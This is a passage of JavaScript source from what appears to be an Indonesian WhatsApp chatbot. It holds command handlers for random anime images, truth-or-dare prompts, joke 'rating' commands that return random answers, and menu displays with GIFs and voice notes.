if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { simp } = require('./datanya/anime/simp') 
let simpnya = simp[Math.floor(Math.random() * simp.length)]
juna.sendMessage(m.chat, { image: { url: simpnya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'tomori': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { tomori } = require('./datanya/anime/tomori') 
let tomorinya = tomori[Math.floor(Math.random() * tomori.length)]
juna.sendMessage(m.chat, { image: { url: tomorinya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'toukachan': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { toukachan } = require('./datanya/anime/toukachan') 
let toukachannya = toukachan[Math.floor(Math.random() * toukachan.length)]
juna.sendMessage(m.chat, { image: { url: toukachannya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'tsunade': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { tsunade } = require('./datanya/anime/tsunade') 
let tsunadenya = tsunade[Math.floor(Math.random() * tsunade.length)]
juna.sendMessage(m.chat, { image: { url: tsunadenya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
 case 'yatogami': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { yatogami } = require('./datanya/anime/yatogami') 
let yatogaminya = yatogami[Math.floor(Math.random() * yatogami.length)]
juna.sendMessage(m.chat, { image: { url: yatogaminya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'yuki': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { yuki } = require('./datanya/anime/yuki') 
let yukinya = yuki[Math.floor(Math.random() * yuki.length)]
juna.sendMessage(m.chat, { image: { url: yukinya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'sewabot': case 'daftarprem': case 'buyprem': case 'price': case 'sewa': {
const { sewanya} = require('./menu') 
newReply(`${sewanya}`)
}
break
// Fun Menu
case 'dare': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { dare } = require('./datanya/truth-dare/dare') 
const darenya = dare[Math.floor(Math.random() * dare.length)]
await juna.sendMessage(m.chat, {
text: darenya, 
contextInfo: {
externalAdReply: {  
title: `𝙂𝙖𝙢𝙚 𝙏𝙧𝙪𝙩𝙝 𝙊𝙧 𝘿𝙖𝙧𝙚`,
body: '𝗞𝗮𝗺𝘂 𝗠𝗲𝗺𝗶𝗹𝗶𝗵 𝗗𝗮𝗿𝗲',
thumbnailUrl: 'https://telegra.ph/file/91d612a8de859e4e47f30.jpg', 
sourceUrl: '',
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
limitAdd(m.sender, limit)
break
case 'truth': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { truth } = require('./datanya/truth-dare/truth') 
const truthnya = truth[Math.floor(Math.random() * truth.length)]
await juna.sendMessage(m.chat, {
text: truthnya, 
contextInfo: {
externalAdReply: {  
title: `𝙂𝙖𝙢𝙚 𝙏𝙧𝙪𝙩𝙝 𝙊𝙧 𝘿𝙖𝙧𝙚`,
body: '𝗞𝗮𝗺𝘂 𝗠𝗲𝗺𝗶𝗹𝗶𝗵 𝗧𝗿𝘂𝘁𝗵',
thumbnailUrl: 'https://telegra.ph/file/91d612a8de859e4e47f30.jpg', 
sourceUrl: '',
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
limitAdd(m.sender, limit)
break
case 'apakah': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return newReply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
newReply(`Pertanyaan : Apakah ${q}\nJawaban : ${kah}`)
}
limitAdd(m.sender, limit)
break
case 'bisakah': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return newReply(`Penggunaan ${command} text\n\nContoh : ${command} saya menjadi presiden`)
const bisa = ['Bisa', 'Gak Bisa', 'Gak Bisa Ajg Aaokawpk', 'TENTU PASTI KAMU BISA!!!!']
const ga = bisa[Math.floor(Math.random() * bisa.length)]
newReply(`Pertanyaan : Apakah ${q}\nJawaban : ${ga}`)
}
limitAdd(m.sender, limit)
break
case 'bagaimanakah': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return newReply(`Penggunaan ${command} text\n\nContoh : ${command} cara mengatasi sakit hati`)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel', 'astaghfirallah Beneran???', 'Pusing ah', 'Owhh Begitu:(', 'Gimana yeee']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
newReply(`Pertanyaan : Apakah ${q}\nJawaban : ${ya}`)
}
limitAdd(m.sender, limit)
break
case 'rate': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return newReply(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
const ra = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const te = ra[Math.floor(Math.random() * ra.length)]
newReply(`Rate : ${q}\nJawaban : *${te}%*`)
}
limitAdd(m.sender, limit)
break
case 'gantengcek': case 'cekganteng': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return newReply(`Penggunaan ${command} Nama\n\nContoh : ${command} Owner`)
const gan = ['10% banyak" perawatan ya bang:v\nCanda Perawatan:v','30% Semangat bang Merawat Dirinya><','20% Semangat Ya bang👍','40% Wahh bang><','50% abang Ganteng deh><','60% Hai Ganteng🐊','70% Hai Ganteng🐊','62% Bang Ganteng><','74% abang ni ganteng deh><','83% Love You abang><','97% Assalamualaikum Ganteng🐊','100% Bang Pake Susuk ya??:v','29% Semangat Bang:)','94% Hai Ganteng><','75% Hai Bang Ganteng','82% wihh abang Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const teng = gan[Math.floor(Math.random() * gan.length)]
newReply(`Nama : ${q}\nJawaban : *${teng}*`)
}
limitAdd(m.sender, limit)
break           
case 'cantikcek': case 'cekcantik': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return newReply(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
const can = ['10% banyak" perawatan ya kak:v\nCanda Perawatan:v','30% Semangat Kaka Merawat Dirinya><','20% Semangat Ya Kaka👍','40% Wahh Kaka><','50% kaka cantik deh><','60% Hai Cantik🐊','70% Hai Ukhty🐊','62% Kakak Cantik><','74% Kakak ni cantik deh><','83% Love You Kakak><','97% Assalamualaikum Ukhty🐊','100% Kakak Pake Susuk ya??:v','29% Semangat Kakak:)','94% Hai Cantik><','75% Hai Kakak Cantik','82% wihh Kakak Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const tik = can[Math.floor(Math.random() * can.length)]
newReply(`Nama : ${q}\nJawaban : *${tik}*`)
}
limitAdd(m.sender, limit)
break
case 'sangecek': case 'ceksange': case 'gaycek': case 'cekgay': case 'lesbicek': case 'ceklesbi': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return newReply(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
const sangeh = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
newReply(`Nama : ${q}\nJawaban : *${sange}%*`)
}
limitAdd(m.sender, limit)
break
case 'kapankah': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return newReply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi', '20 Hari Lagi', '25 Hari Lagi', '30 Hari Lagi', '35 Hari Lagi', '40 Hari Lagi', '45 Hari Lagi', '50 Hari Lagi', '55 Hari Lagi', '60 Hari Lagi', '65 Hari Lagi', '70 Hari Lagi', '75 Hari Lagi', '80 Hari Lagi', '85 Hari Lagi', '90 Hari Lagi', '95 Hari Lagi', '100 Hari Lagi', '5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', '20 Bulan Lagi', '25 Bulan Lagi', '30 Bulan Lagi', '35 Bulan Lagi', '40 Bulan Lagi', '45 Bulan Lagi', '50 Bulan Lagi', '55 Bulan Lagi', '60 Bulan Lagi', '65 Bulan Lagi', '70 Bulan Lagi', '75 Bulan Lagi', '80 Bulan Lagi', '85 Bulan Lagi', '90 Bulan Lagi', '95 Bulan Lagi', '100 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', 'Besok', 'Lusa', `Abis Command Ini Juga Lu ${q}`]
const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
newReply(`Pertanyaan : ${q}\nJawaban : *${kapankah}*`)
}
limitAdd(m.sender, limit)
break
case 'wangy': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return newReply(`Contoh : ${prefix}wangy Juna`)
qq = q.toUpperCase()
awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
newReply(awikwok)
}
limitAdd(m.sender, limit)
break
case 'allmenu':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#allmenu', m.sender, _cmd)
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
let gif = `${setting.gifmenu}`
await juna.sendMessage(m.chat, {
video: {url: gif},
gifPlayback: true,
caption: allMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {
title: `Halo ${pushname} Selamat ${ucapanWaktu}`, 
body: '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
thumbnailUrl: pathimg, 
sourceUrl: gcwa, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'menu': case 'simplemenu': case 'help':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#menu', m.sender, _cmd)
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
let gif = `${setting.gifmenu}`
await juna.sendMessage(m.chat, {
video: {url: gif},
gifPlayback: true,
caption: simpleMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {
title: `Halo ${pushname} Selamat ${ucapanWaktu}`, 
body: '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
thumbnailUrl: pathimg, 
sourceUrl: gcwa, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'mainmenu':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#mainmenu', m.sender, _cmd)
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
let gif = `${setting.gifmenu}`
await juna.sendMessage(m.chat, {
video: {url: gif},
gifPlayback: true,
caption: mainMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {
title: `Halo ${pushname} Selamat ${ucapanWaktu}`, 
body: '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
thumbnailUrl: pathimg, 
sourceUrl: gcwa, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'convertmenu':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#convertmenu', m.sender, _cmd)
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
let gif = `${setting.gifmenu}`
await juna.sendMessage(m.chat, {
video: {url: gif},
gifPlayback: true,
caption: convertMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {
title: `Halo ${pushname} Selamat ${ucapanWaktu}`, 
body: '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
thumbnailUrl: pathimg, 
sourceUrl: gcwa, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'voicechanger':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#voicechanger', m.sender, _cmd)
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
let gif = `${setting.gifmenu}`
await juna.sendMessage(m.chat, {
video: {url: gif},
gifPlayback: true,
caption: voiceChanger(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {
title: `Halo ${pushname} Selamat ${ucapanWaktu}`, 
body: '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
thumbnailUrl: pathimg, 
sourceUrl: gcwa, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'anonymousmenu':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#anonymousmenu', m.sender, _cmd)
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
let gif = `${setting.gifmenu}`
await juna.sendMessage(m.chat, {
video: {url: gif},
gifPlayback: true,
caption: anonymousMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {
title: `Halo ${pushname} Selamat ${ucapanWaktu}`, 
body: '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
thumbnailUrl: pathimg, 
sourceUrl: gcwa, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'storemenu':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#storemenu', m.sender, _cmd)
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
let gif = `${setting.gifmenu}`
await juna.sendMessage(m.chat, {
video: {url: gif},
gifPlayback: true,
caption: storeMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {
title: `Halo ${pushname} Selamat ${ucapanWaktu}`, 
body: '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
thumbnailUrl: pathimg, 
sourceUrl: gcwa, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'rpgmenu':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#rpgmenu', m.sender, _cmd)
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
let gif = `${setting.gifmenu}`
await juna.sendMessage(m.chat, {
video: {url: gif},
gifPlayback: true,
caption: rpgMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {
title: `Halo ${pushname} Selamat ${ucapanWaktu}`, 
body: '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
thumbnailUrl: pathimg, 
sourceUrl: gcwa, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'gamemenu':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#gamemenu', m.sender, _cmd)
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
let gif = `${setting.gifmenu}`
await juna.sendMessage(m.chat, {
video: {url: gif},
gifPlayback: true,
caption: gameMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {
title: `Halo ${pushname} Selamat ${ucapanWaktu}`, 
body: '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
thumbnailUrl: pathimg, 
sourceUrl: gcwa, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'groupmenu':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#groupmenu', m.sender, _cmd)
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
let gif = `${setting.gifmenu}`
await juna.sendMessage(m.chat, {
video: {url: gif},
gifPlayback: true,
caption: groupMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {
title: `Halo ${pushname} Selamat ${ucapanWaktu}`, 
body: '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
thumbnailUrl: pathimg, 
sourceUrl: gcwa, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'downloadmenu':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#downloadmenu', m.sender, _cmd)
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
let gif = `${setting.gifmenu}`
await juna.sendMessage(m.chat, {
video: {url: gif},
gifPlayback: true,
caption: downloadMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {
title: `Halo ${pushname} Selamat ${ucapanWaktu}`, 
body: '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
thumbnailUrl: pathimg, 
sourceUrl: gcwa, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'updatedfitur': case 'fiturbaru': case 'updatemenu': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#downloadmenu', m.sender, _cmd)
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
let gif = `${setting.gifmenu}`
await juna.sendMessage(m.chat, {
video: {url: gif},
gifPlayback: true,
caption: updatedMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {
title: `Halo ${pushname} Selamat ${ucapanWaktu}`, 
body: '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
thumbnailUrl: pathimg, 
sourceUrl: gcwa, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'searchmenu':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#searchmenu', m.sender, _cmd)
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
let gif = `${setting.gifmenu}`
await juna.sendMessage(m.chat, {
video: {url: gif},
gifPlayback: true,
caption: searchMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {
title: `Halo ${pushname} Selamat ${ucapanWaktu}`, 
body: '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
thumbnailUrl: pathimg, 
sourceUrl: gcwa, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'randommenu':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#randommenu', m.sender, _cmd)
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
let gif = `${setting.gifmenu}`
await juna.sendMessage(m.chat, {
video: {url: gif},
gifPlayback: true,
caption: randomMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {
title: `Halo ${pushname} Selamat ${ucapanWaktu}`, 
body: '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
thumbnailUrl: pathimg, 
sourceUrl: gcwa, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'randomanime':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#randomanime', m.sender, _cmd)
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
let gif = `${setting.gifmenu}`
await juna.sendMessage(m.chat, {
video: {url: gif},
gifPlayback: true,
caption: randomAnime(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {
title: `Halo ${pushname} Selamat ${ucapanWaktu}`, 
body: '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
thumbnailUrl: pathimg, 
sourceUrl: gcwa, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'voicechanger':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#voicechanger', m.sender, _cmd)
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
let gif = `${setting.gifmenu}`
await juna.sendMessage(m.chat, {
video: {url: gif},
gifPlayback: true,
caption: voiceChanger(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {
title: `Halo ${pushname} Selamat ${ucapanWaktu}`, 
body: '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
thumbnailUrl: pathimg, 
sourceUrl: gcwa, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
